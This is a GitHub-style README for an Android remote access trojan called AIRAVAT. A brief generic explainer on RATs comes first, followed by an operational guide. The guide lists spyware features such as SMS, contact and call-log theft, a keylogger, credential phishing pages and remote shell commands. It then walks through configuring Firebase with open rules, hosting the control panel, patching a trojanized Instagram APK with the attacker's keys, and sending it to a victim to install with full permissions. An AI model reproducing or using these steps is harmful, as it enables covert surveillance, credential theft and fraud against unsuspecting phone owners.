# Android-RAT
 Android RAT with GUI Web Panel Without Port Forwarding

 # What is RAT (Trojan access)?

Remote Trojan (RAT) is a malicious computer program that involves the back door of a targeted computer. RATs are usually invisibly downloaded through a user-requested program – such as a game – or sent as an email attachment. If the hosting system is compromised, the hacker may use it to distribute RATs to other compromised computers and establish a botnet. Android RAT AIRAVAT

Because RAT enables administrative control, it makes it possible for the attacker to do anything on the target computer, including:

Monitor user behavior using keyloggers or other monitors.
Access to confidential information, such as credit card and social security numbers.
Activating the web camera system and video recording.
Taking screenshots.
Viral transmission and other malware.
Formatting drives.
Deleting, downloading, or modifying files and file systems.
The Back Orifice rootkit is one of the most popular examples of RAT. A group of hackers known as Cult of the Dead Cow has created Back Orifice to expose security vulnerabilities to Microsoft Windows applications.

RATs can be difficult to find because they usually do not show up in the list of active programs or activities. The actions they take may be similar to those of legal programs. In addition, the criminal often controls the level of use of the device so that the decline in performance does not warn the user that something is amiss. Android RAT AIRAVAT AIRAVAT AIRAVAT AIRAVAT AIRAVAT

To protect your system from RATs, follow the same procedures you use to prevent other computer malware infections: Keep antivirus software up to date and refrain from downloading programs or unlocking programs that do not come from a trusted source. At the management level, it is always a good idea to block unused ports, close unused resources, and monitor outgoing traffic.

#Features :

Read all the files of Internal Storage
Download Any Media to your Device from Victims Device
Get all the system information of the Victim’s Device
Retrieve the List of Installed Applications
Retrieve SMS
Retrieve Call Logs
Retrieve Contacts
Send SMS
Gets all the Notifications
Keylogger
Admin Permission
Show Phishing Pages to steal credentials through notification
Record Audio
Play music on Victim’s device
Vibrate Device
Text To Speech
Change Wallpaper
Run shell Commands
Pre-Bonded with Instagram Webview Phishing
Runs In Background
Auto Starts on restarting the device
No port forwarding needed

# firebase Account

ApkEasy Tool ( For PC ) : https://apk-easy-tool.en.lo4d.com/windows
Apk Editor Pro+ ( for Android) : https://onehost.io/uploads/2022/APK_Editor_3.0_mod.apk

# Firebase Setup :

1 – First you need to open an account in Google Firebase and create a new project with any name.

link : https://firebase.google.com/

# 2 – create a new project with any name. and click Continue Button (Your new project is ready)

# 3 – Enable Firebase Database and Firebase Storage.

Click Build > Firestore Database > and Click Create database button (Start in production mode). Next and Enable Button

Click Build > Storage > Rules – Remove false word and Replace true . and Publish

Click Build > Authentication > Get started . > Sign-in method > Email/Password . Enable and Save

Build > Realtime Database > Create Database . Next and Enable Database . Open Rules Remove false word and Replace true . and Publish


{

     "rules": {

             ".read": "true",

             ".write": "true"

              }

    }

    
# 4. In Firebase Storage allow reads and writes for all paths.

Now Go to project overview and Click the Android logo. create an Android App and download the google-services.json file.

Now Go to the project overview and Click the Web logo. create a web app and copy the config of the web app. and save Add Firebase SDK all code


# Panel Setup :

You can use the Github pages or any Hosting Website to host the panel. (Using Free Hosting)

If it works without any hosting, you will need an Apache server to run it on any of your localhosts

Windows User Install – XAMPP 
Linux User Install – Apache 
Android User Install – Apache App , Start Apache Termux App


# Now you need to download this file from here and upload it to your localhost and Web Hosting. and extract the Zip file. Move Web Panel all file home folder


Download link : https://github.com/Th30neAnd0nly/AIRAVAT/archive/refs/heads/main.zip


Upload Zip Web Hosting & Localhost (Apache ) . and extract zip or Open WEB PANEL Folder and Move all file Home Folder

Open & Edit index.html File and from line number 16 replace the config with your web app config which you have created in Step 4. Chack you save this code. (config of the web app)

Remove API, kay, and add your API, key

Save the file, Your Panel Setup is completed.


# Setup Android RAT : 

Then I will download one of your Android apps, edit the Android apps and make your RAT.

# 1 – Download the Instagram.apk app

Apk app link Download : https://github.com/Th30neAnd0nly/AIRAVAT/raw/main/ANDROID%20APP/Instagram.apk


# 2. Then you will open the APK editor we have given you and select it from the apps and click on full edit. Decompiler recommend above

After the app is decomposed, the Excel file will open and this location will remain.

Now open res/values/strings.xml file.

Then you have to edit some of the apps’ ID APIs from the Google database from which you downloaded the Google service file. You have to open some of your code and add it here.

Replace values of firebase_database_url , google_api_key , google_app_id , google_storage_bucket , project_id with your Firebase Account using google-services.json file which you have downloaded on step 4

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Example :

<string name="firebase_database_url">https://your_database_url.firebase.com</string>

<string name="google_api_key">your_api_key</string>

<string name="google_app_id">your_app_id</string>

<string name="google_storage_bucket">your_storage_bucket_url</string>

<string name="project_id">project_id</string>

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Open google-services.json file and copy your API, id, key, and paste strings.xml file.

After replacing all the code files Click Save Button & click Build App

Then you have to send this application to your victim.

Install the app on the victim’s device and give all the permissions after that the connection will show up in the web panel.


![img](https://github.com/techteams0/Android-RAT/assets/64240810/4474677a-1f11-4ff6-a33d-380472a921de)












